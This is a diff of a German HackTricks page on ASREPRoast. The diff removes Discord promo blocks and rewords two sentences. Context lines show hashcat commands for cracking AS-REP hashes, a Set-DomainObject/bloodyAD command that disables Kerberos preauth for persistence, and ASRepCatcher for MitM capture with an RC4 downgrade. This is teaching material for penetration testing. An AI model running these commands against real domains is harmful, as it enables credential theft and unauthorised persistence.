@@ -2,21 +2,6 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
-
-Tritt dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!
-
-**Hacking Insights**\
-Engagieren Sie sich mit Inhalten, die in die Aufregung und Herausforderungen des Hackens eintauchen
-
-**Echtzeit-Hack-Nachrichten**\
-Bleiben Sie auf dem Laufenden über die schnelllebige Hackerwelt durch Echtzeitnachrichten und Einblicke
-
-**Neueste Ankündigungen**\
-Bleiben Sie informiert über die neuesten Bug-Bounties und wichtige Plattform-Updates
-
-**Tritt uns bei auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginne noch heute mit den besten Hackern zusammenzuarbeiten!
-
 ## ASREPRoast
 
 ASREPRoast ist ein Sicherheitsangriff, der Benutzer ausnutzt, die das **Kerberos-Vorab-Authentifizierungsattribut** nicht haben. Im Wesentlichen ermöglicht diese Schwachstelle Angreifern, die Authentifizierung für einen Benutzer vom Domain Controller (DC) anzufordern, ohne das Passwort des Benutzers zu benötigen. Der DC antwortet dann mit einer Nachricht, die mit dem aus dem Passwort des Benutzers abgeleiteten Schlüssel verschlüsselt ist, den Angreifer offline zu knacken versuchen können, um das Passwort des Benutzers zu entdecken.
@@ -57,7 +42,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistenz
 
-Zwinge **preauth** nicht für einen Benutzer, bei dem du **GenericAll** Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) hast:
+Zwingen Sie **preauth**, das für einen Benutzer, bei dem Sie **GenericAll**-Berechtigungen (oder Berechtigungen zum Schreiben von Eigenschaften) haben, nicht erforderlich ist:
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -67,7 +52,7 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ```
 ## ASREProast ohne Anmeldeinformationen
 
-Ein Angreifer kann eine Man-in-the-Middle-Position nutzen, um AS-REP-Pakete abzufangen, während sie das Netzwerk durchqueren, ohne sich darauf zu verlassen, dass die Kerberos-Vorab-Authentifizierung deaktiviert ist. Es funktioniert daher für alle Benutzer im VLAN.\
+Ein Angreifer kann eine Man-in-the-Middle-Position nutzen, um AS-REP-Pakete abzufangen, während sie das Netzwerk durchqueren, ohne sich auf die Deaktivierung der Kerberos-Vorab-Authentifizierung zu verlassen. Es funktioniert daher für alle Benutzer im VLAN.\
 [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) ermöglicht uns dies. Darüber hinaus zwingt das Tool Client-Workstations, RC4 zu verwenden, indem es die Kerberos-Verhandlung ändert.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
@@ -84,20 +69,5 @@ ASRepCatcher listen
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
 
 ---
-
-<figure><img src="../../images/image (3).png" alt=""><figcaption></figcaption></figure>
-
-Tritt dem [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) Server bei, um mit erfahrenen Hackern und Bug-Bounty-Jägern zu kommunizieren!
-
-**Hacking Einblicke**\
-Engagiere dich mit Inhalten, die in den Nervenkitzel und die Herausforderungen des Hackens eintauchen
-
-**Echtzeit-Hack-Nachrichten**\
-Bleibe auf dem Laufenden über die schnelllebige Hack-Welt durch Echtzeit-Nachrichten und Einblicke
-
-**Neueste Ankündigungen**\
-Bleibe informiert über die neuesten Bug-Bounties und wichtige Plattform-Updates
-
-**Tritt uns bei auf** [**Discord**](https://discord.com/invite/N3FrSbmwdy) und beginne noch heute mit den besten Hackern zusammenzuarbeiten!
 
 {{#include ../../banners/hacktricks-training.md}}
